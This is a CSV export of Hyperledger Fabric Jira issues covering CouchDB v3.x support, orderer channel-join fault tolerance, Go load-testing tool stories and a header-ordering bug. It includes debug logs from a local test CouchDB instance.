I've added subtasks for the known work items. There may be other changes required once the testing starts.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support v3.x CouchDB users database,FAB-17994,45268,45267,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Jun/20 1:18 AM,27/Jun/20 12:22 AM,28/Oct/23 3:10 AM,27/Jun/20 12:22 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"An admin id/password is required starting in v3.x.
Upon first start peer creates CouchDB users database and updates its security object.
This is not supported in CouchDB v3.x, it returns error ""You can't edit the security object of the user database.""

{code:java}
2020-06-15 12:14:14.120 EDT [couchdb] VerifyCouchConfig -> DEBU 024 VerifyConnection() dbResponseJSON: %s
2020-06-15 12:14:14.120 EDT [couchdb] CreateDatabaseIfNotExist -> DEBU 025 [_users] Entering CreateDatabaseIfNotExist()
2020-06-15 12:14:14.120 EDT [couchdb] handleRequest -> DEBU 026 Entering handleRequest() method=GET url=http://127.0.0.1:5984 dbName=_users
2020-06-15 12:14:14.120 EDT [couchdb] handleRequest -> DEBU 027 Request URL: http://127.0.0.1:5984/_users
2020-06-15 12:14:14.120 EDT [couchdb] handleRequest -> DEBU 028 HTTP Request: GET /_users HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Authorization: Basic YWRtaW46cGFzc3dvcmQ= | Accept-Encoding: gzip | | 
2020-06-15 12:14:14.127 EDT [couchdb] handleRequest -> DEBU 029 Error handling CouchDB request. Error:not_found, Status Code:404, Reason:Database does not exist.
2020-06-15 12:14:14.127 EDT [couchdb] CreateDatabaseIfNotExist -> DEBU 02a [_users] Database does not exist.
2020-06-15 12:14:14.127 EDT [couchdb] handleRequest -> DEBU 02b Entering handleRequest() method=PUT url=http://127.0.0.1:5984 dbName=_users
2020-06-15 12:14:14.127 EDT [couchdb] handleRequest -> DEBU 02c Request URL: http://127.0.0.1:5984/_users
2020-06-15 12:14:14.127 EDT [couchdb] handleRequest -> DEBU 02d HTTP Request: PUT /_users HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Content-Length: 0 | Accept: application/json | Authorization: Basic YWRtaW46cGFzc3dvcmQ= | Content-Type: application/json | Accept-Encoding: gzip | | 
2020-06-15 12:14:14.190 EDT [couchdb] handleRequest -> DEBU 02e Exiting handleRequest()
2020-06-15 12:14:14.190 EDT [couchdb] ApplyDatabaseSecurity -> DEBU 02f [_users] Entering ApplyDatabaseSecurity()
2020-06-15 12:14:14.190 EDT [couchdb] ApplyDatabaseSecurity -> DEBU 030 [_users] Applying security to database: \{""admins"":{""names"":[""admin""],""roles"":[]},""members"":\{""names"":[""admin""],""roles"":[]}}
2020-06-15 12:14:14.190 EDT [couchdb] handleRequest -> DEBU 031 Entering handleRequest() method=PUT url=http://127.0.0.1:5984 dbName=_users
2020-06-15 12:14:14.190 EDT [couchdb] handleRequest -> DEBU 032 Request URL: http://127.0.0.1:5984/_users/_security
2020-06-15 12:14:14.191 EDT [couchdb] handleRequest -> DEBU 033 HTTP Request: PUT /_users/_security HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Content-Length: 82 | Accept: application/json | Authorization: Basic YWRtaW46cGFzc3dvcmQ= | Content-Type: application/json | Accept-Encoding: gzip | | 
2020-06-15 12:14:14.207 EDT [couchdb] handleRequest -> DEBU 034 Error handling CouchDB request. Error:forbidden, Status Code:403, Reason:You can't edit the security object of the user database.
{code}
",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d2r:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Fabric unit tests to use CouchDB admin id/password,FAB-17995,45269,45267,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Jun/20 3:32 AM,27/Jun/20 12:22 AM,28/Oct/23 3:10 AM,27/Jun/20 12:22 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,CouchDB v3.x requires that an admin id/password be configured.,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d2z:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Fabric integration tests to use CouchDB admin id/password,FAB-17996,45270,45267,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Jun/20 3:33 AM,27/Jun/20 12:22 AM,28/Oct/23 3:10 AM,27/Jun/20 12:22 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,CouchDB v3.x requires that an admin id/password be configured.,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d37:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Speculatively apply config update before validating raft consenters,FAB-17998,45274,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,chbtt,chbtt,16/Jun/20 9:37 PM,20/Sep/20 1:12 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,Duplicate,,,,,"Since FAB-17733 adding a new raft consenter requires a valid certificate chain for its TLS certificates to be present in the orderer group. However, this means that you need two separate config updates to the channel in order to add a new organisation that contributes raft consenters.

Please consider speculatively applying the config update before validating raft consenters ([as suggested by Yacov|https://lists.hyperledger.org/g/fabric/message/8525]) to be able to add such a new organisation with a single config update.",,chbtt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18192,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d3v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),chbtt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove unnecessary calls to CouchDB _ensure_full_commit,FAB-17999,45275,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,16/Jun/20 10:30 PM,25/Jun/20 9:13 PM,28/Oct/23 3:10 AM,25/Jun/20 9:13 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Since CouchDB _ensure_full_commit turns out to be a noop, Fabric requires delayed_commits to be false (FABB-151), and therefore the call to _ensure_full_commit after writing a block to CouchDB can be removed.",,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABB-151,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqr",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/20 7:22 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1435;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support Invokes in Go PTE,FAB-18000,45280,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,btl5037,btl5037,17/Jun/20 12:56 AM,21/Jul/20 11:07 PM,28/Oct/23 3:10 AM,21/Jul/20 11:07 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The operator tool should have the ability to send Invokes directly to the peer using the GoSDK and should not have to cede control to the Node.js implementation of PTE.

Implement an event listener, this should be registered on the transaction and is used to determine how many transactions were successful, as well as a gate for determining when to send the next transaction.

The logic should support the ability to send transactions in two manners:
 * Load
 ** This should send transactions as fast as possible
 * Constant
 ** This should accept a duration in milliseconds, which is the time between sending successive transactions
 ** It should also accept a ""deviation"" value, which is the range of the first standard deviation from the duration mentioned above. The transactions will be sent at some interval in this range randomly.

We should also support the following targets for execution:
 * All
 ** Submit transactions to all peers
 * Target
 ** Send to a predefined list of peers
 * Org
 ** Send to all peers in an org
 * Anchor
 ** Send to the first peer in each org in the connection profile (which has been configured by the operator as the anchor peer)
 * Service Discovery
 ** Enable service discovery for submitting transactions",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17974,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17974,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2p",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support Queries in Go PTE,FAB-18001,45281,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,btl5037,btl5037,17/Jun/20 12:58 AM,21/Jul/20 11:07 PM,28/Oct/23 3:10 AM,21/Jul/20 11:07 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17974,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17974,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2q",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bootstrap blockstore for a channel from previously snapshotted TXIDs,FAB-18002,45282,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,17/Jun/20 12:37 PM,23/Jun/20 6:44 AM,28/Oct/23 3:10 AM,23/Jun/20 6:44 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d4z:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/20 6:44 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1413;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bootstrap config store for a channel from snapshot files,FAB-18003,45283,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,17/Jun/20 1:08 PM,27/Jun/20 3:10 PM,28/Oct/23 3:10 AM,27/Jun/20 3:10 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d57:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support Creating Go SDK Connection Profiles,FAB-18004,45291,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,btl5037,btl5037,17/Jun/20 11:54 PM,21/Jul/20 11:07 PM,28/Oct/23 3:10 AM,21/Jul/20 11:07 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The Go SDK uses non-standard connection profiles, until such a time as this changes we need to add support for creating connection profiles in the form the Go SDK expects.

Do some investigation, figure out what the gaps are, then update this Jira to include what needs to be changed, then implement it.

*Acceptance Criteria*: Operator creates a Go SDK standardized connection profile",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17974,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2o",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Re-visit CouchDB index warming for CouchDB v3.1.x,FAB-18005,45292,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,denyeart,denyeart,18/Jun/20 3:57 AM,25/Jan/21 11:33 PM,28/Oct/23 3:10 AM,25/Jan/21 11:33 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"When using CouchDB v2.x, peer triggers CouchDB index maintenance based on core.yaml setting:
{code:java}
       # Warm indexes after every N blocks.
       # This option warms any indexes that have been
       # deployed to CouchDB after every N blocks.
       # A value of 1 will warm indexes after every block commit,
       # to ensure fast selector queries.
       # Increasing the value may improve write efficiency of peer and CouchDB,
       # but may degrade query response time.
       warmIndexesAfterNBlocks: 1
{code}
This may not be needed when using CouchDB v3.x, from the CouchDB release notes:

#1910: Automatic background indexing, internally known as ken. This subsystem ensures secondary indexes (such as JavaScript, Mango, and text search) are kept up to date, without requiring an external query to trigger building them. Many configuration parameters are available.

Details in CouchDB docs: [https://docs.couchdb.org/en/3.1.1/config/indexbuilds.html#config-index-builds]",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17993,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxoc",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Nov/20 5:44 AM;denyeart;With the default at warmIndexesAfterNBlocks: 1, we'll see the index get warmed after block commit, as evidenced in the peer and couchdb logs:

Peer log entries with ""couchdb"" debug:
{code:java}
2020-11-23 15:29:27.996 EST [couchdb] warmIndexAllIndexes -> DEBU 69a [mychannel_marbles] Entering WarmIndexAllIndexes()
2020-11-23 15:29:27.996 EST [couchdb] listIndex -> DEBU 69c [mychannel_marbles] Entering ListIndex()
2020-11-23 15:29:27.996 EST [couchdb] handleRequest -> DEBU 6a0 Request URL: http://127.0.0.1:5984/mychannel_marbles/_index
2020-11-23 15:29:28.005 EST [couchdb] listIndex -> DEBU 6a6 [mychannel_marbles] Exiting ListIndex()
2020-11-23 15:29:28.005 EST [couchdb] warmIndex -> DEBU 6a7 [mychannel_marbles] Entering WarmIndex() designdoc=indexOwnerDoc indexname=indexOwner
2020-11-23 15:29:28.006 EST [couchdb] handleRequest -> DEBU 6a9 Request URL: http://127.0.0.1:5984/mychannel_marbles/_design/indexOwnerDoc/_view/indexOwner?stale=update_after{code}
 

Couchdb log entries:

 
{code:java}
[info] 2020-11-23T20:29:28.012350Z nonode@nohost <0.4156.0> -------- Starting index update for db: shards/80000000-ffffffff/mychannel_marbles.1606163331 idx: _design/indexOwnerDoc
[notice] 2020-11-23T20:29:28.019118Z nonode@nohost <0.3570.0> c009f28c7c 127.0.0.1:5984 172.17.0.1 admin GET /mychannel_marbles/_index 200 ok 7
[info] 2020-11-23T20:29:28.062627Z nonode@nohost <0.4156.0> -------- Index update finished for db: shards/80000000-ffffffff/mychannel_marbles.1606163331 idx: _design/indexOwnerDoc
[notice] 2020-11-23T20:29:28.094637Z nonode@nohost <0.3570.0> 87b0a1e83d 127.0.0.1:5984 172.17.0.1 admin GET /mychannel_marbles/_design/indexOwnerDoc/_view/indexOwner?stale=update_after 200 ok 74{code};;;","24/Nov/20 6:01 AM;denyeart;Approach:

With warmIndexesAfterNBlocks=0, create a large number of entries in CouchDB 2.3.1 state database.

Perform a JSON _find query that requires an index. In the CouchDB logs, you should see the data was not indexed until the query executes for the first time. The query will delay while the index builds.

Do the same trial using CouchDB 3.1.1. In the CouchDB logs, you should see the data gets indexed as blocks are committed.  The first JSON _find query should be quick this time, since the index is already built.

Identify optimal automatic index settings in CouchDB, per the CouchDB release notes, ""Many configuration parameters are available"".

Once automatic indexing is confirmed, the index warming code can then be removed from Fabric block commit logic.;;;","25/Jan/21 11:33 PM;denyeart;https://github.com/hyperledger/fabric/pull/2252;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Re-visit CouchDB compaction settings for CouchDB v3.1.x,FAB-18006,45293,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,denyeart,denyeart,18/Jun/20 3:58 AM,25/Jan/21 11:34 PM,28/Oct/23 3:10 AM,25/Jan/21 11:34 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"CouchDB v3.x has updated the compaction daemon, therefore the recommended CouchDB settings for use with Fabric may change.

From the CouchDB 3.0 release notes:

[#1904|https://github.com/apache/couchdb/issues/1904]: Completely rewritten [automatic compaction daemon|https://docs.couchdb.org/en/3.1.0/maintenance/compaction.html#compact-auto], internally known as {{smoosh}}. This subsystem automatically triggers background compaction jobs for both databases and views, based on [configurable thresholds|https://docs.couchdb.org/en/3.1.0/config/compaction.html#config-database-compaction].",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17993,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxof",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Nov/20 6:21 AM;denyeart;Compare the settings available in CouchDB 2.3.1 versus 3.1.1.

[https://docs.couchdb.org/en/2.3.1/config/compaction.html]

[https://docs.couchdb.org/en/3.1.1/config/compaction.html]

See the defaults for CouchDB compaction in /opt/couchdb/etc/default.ini.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Content-Type not always set before writing header,FAB-18007,45294,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,18/Jun/20 4:03 AM,21/Jul/20 4:35 AM,28/Oct/23 3:10 AM,19/Jun/20 6:32 AM,v1.4.6,v2.1.0,,,,,,,,v1.4.8,v2.2.0,,,fabric-common,,,,,,,,,0,ipm,,,,,"(At least) the logspec and channel-participation calls on the operations service set the Content-Type (application/json for these examples) AFTER calling resp.WriteHeader(). This should be done before writing the header. 

 

Update the affected code and tests (ensuring we use the Result() from the httptest.ResponseRecorder instead of the ResponseRecorder directly) for these functions and check for any other places where we set the content-type at the incorrect time.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzog",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jun/20 5:43 AM;wlahti;master: [https://github.com/hyperledger/fabric/pull/1414]
release-1.4: [https://github.com/hyperledger/fabric/pull/1415];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make joins crash fault tolerant,FAB-18008,45295,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,18/Jun/20 4:12 PM,16/Sep/20 5:13 AM,28/Oct/23 3:10 AM,16/Sep/20 5:13 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"* When processing a join request, persist the join block in the join-block file repo. Remove the joinblock upon successful completion.
 * When restarting the server, process the file-ledger-ChannelIDs() together with the list of channels from the join-block file repo, and reconcile.",,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18082,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d77:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Aug/20 11:25 PM;wlahti;WIP: https://github.com/hyperledger/fabric/pull/1608;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Initialize joinblock file repo during registrar initialization,FAB-18009,45296,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,18/Jun/20 4:14 PM,04/Aug/20 11:23 PM,28/Oct/23 3:10 AM,04/Aug/20 11:23 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Located in a directory named ""filerepo"" under Orderer.FileLedger.Location
Process in the server start up sequence
Open an instance to be used by the registrar (or let the registrar Init do all that)",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d7f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Test the ""negatives"" of a network with a system channel",FAB-18010,45297,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,18/Jun/20 4:29 PM,29/Sep/20 1:59 AM,28/Oct/23 3:10 AM,29/Sep/20 1:59 AM,,,,,,,,,,v2.3.0,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"Check that it is impossible to Join a channel on a network with a system channel.
 Check that it is impossible to Delete an app channel on a network with a system channel.",,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17966,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohfprx4",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Sep/20 5:51 AM;wlahti;https://github.com/hyperledger/fabric/pull/1917;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer with system channel cannot remove app channels,FAB-18011,45298,40571,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,18/Jun/20 4:48 PM,23/Jul/20 9:34 PM,28/Oct/23 3:10 AM,23/Jul/20 9:34 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d7v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jul/20 11:07 PM;wlahti;[https://github.com/hyperledger/fabric/pull/1540];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Explicit fabric version in Fabric Samples,FAB-18012,45316,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,,Specia1,Specia1,18/Jun/20 6:04 PM,19/Jul/20 1:14 PM,28/Oct/23 3:10 AM,19/Jul/20 1:14 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"For the fabric-samples 1.4 branch, docker-compose specifies the version via $IMAGE_TAG, but that version is the latest.([https://github.com/hyperledger/fabric-samples/blob/release-1.4/first-network/base/peer-base.yaml#L10])

Also, in the case of orderer and couch db in docker-compose, the latest version is used because the version is not clearly displayed.([https://github.com/hyperledger/fabric-samples/blob/release-1.4/first-network/base/docker-compose-base.yaml#L11], [https://github.com/hyperledger/fabric-samples/blob/release-1.4/first-network/docker-compose-couch.yaml#L14])

I think our should use a clear version, as this can be confusing for people building a network for the first time using ./byfn.sh up.

 

